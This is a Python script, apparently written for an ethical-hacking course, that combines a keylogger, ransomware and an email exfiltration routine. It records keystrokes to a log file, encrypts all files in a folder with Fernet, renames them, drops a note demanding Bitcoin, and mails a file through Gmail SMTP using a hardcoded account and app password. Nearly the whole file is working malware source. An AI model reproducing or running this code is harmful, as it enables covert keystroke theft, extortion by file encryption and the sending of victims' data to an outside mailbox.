import os
from distutils import extension
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener

#///////////////////////////////////////////////////////////////////////////////////////////////////
extension = 'IUEHackeoEtico202202 - RiaoMora'

def on_press(key):
    try:
        with open("C:\\Users\\emanu\\Downloads\\Keylogger\\log.txt", "a") as f:
            f.write(str(key)+' - ')
    except Exception as e:
        print(str(e))

def on_release(key):
    if key == Key.esc:
        print('entro')
        f = open("C:\\Users\\emanu\\Downloads\\Keylogger\\log.txt", 'r+')
        buffer = f.read()
        f.close()
        return False
    
def generar_key():
    key = Fernet.generate_key()
    with open('riaomora.key', 'wb') as key_file:
        key_file.write(key)
        
def cargar_key():
    return open('riaomora.key', 'rb').read()

def cifrar(items, key):
    f = Fernet(key)
    for item in items:
        #Leer el archivo
        with open(item, 'rb') as file:
            file_data = file.read()
            
        encrypted_data = f.encrypt(file_data)
        
        #Escribir el archivo
        with open(item, 'wb') as file:
            file.write(encrypted_data)
            
        os.rename(item, item + '.' + extension)

#//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

smtp_port = 587                 # Standard secure SMTP port
smtp_server = "smtp.gmail.com"  # Google SMTP Server

# Set up the email lists
email_from = "pruebassoftwarerm@gmail.com"
email_list = ["kuroganerm@gmail.com"]

# Define the password (better to reference externally)
pswd = "pfik vbcv xeex uamy" # As shown in the video this password is now dead, left in as example only


# name the email subject
subject = "New email from ERM with attachments!!"



# Define the email function (dont call it email!)
def send_email(email_list):

    for person in email_list:

        # Make the body of the email
        body = f"""
        Hey There
        This is a Mail
        With attachment
        etc
        """

        # make a MIME object to define parts of the email
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = person
        msg['Subject'] = subject

        # Attach the body of the message
        msg.attach(MIMEText(body, 'plain'))

        # Define the file to attach
        filename = "C:\\Users\\emanu\\Downloads\\Keylogger\\dist\\Keylogger\\Atachment.png"

        # Open the file in python as a binary
        attachment= open(filename, 'rb')  # r for read and b for binary

        # Encode as base 64
        attachment_package = MIMEBase('application', 'octet-stream')
        attachment_package.set_payload((attachment).read())
        encoders.encode_base64(attachment_package)
        attachment_package.add_header('Content-Disposition', "attachment; filename= " + filename)
        msg.attach(attachment_package)

        # Cast as string
        text = msg.as_string()

        # Connect with the server
        print("Connecting to server...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls()
        TIE_server.login(email_from, pswd)
        print("Succesfully connected to server")
        print()


        # Send emails to "person" as list is iterated
        print(f"Sending email to: {person}...")
        TIE_server.sendmail(email_from, person, text)
        print(f"Email sent to: {person}")
        print()

    # Close the port
    TIE_server.quit()

#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\emanu\\Downloads\\Keylog'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '\\' + item for item in items]
    
    generar_key()
    key = cargar_key()
    cifrar(full_path, key)
    
    with open(path_to_encrypt+ '\\README.txt', 'w') as file:
        file.write('Pague Bitcoins')
    
    send_email(email_list)
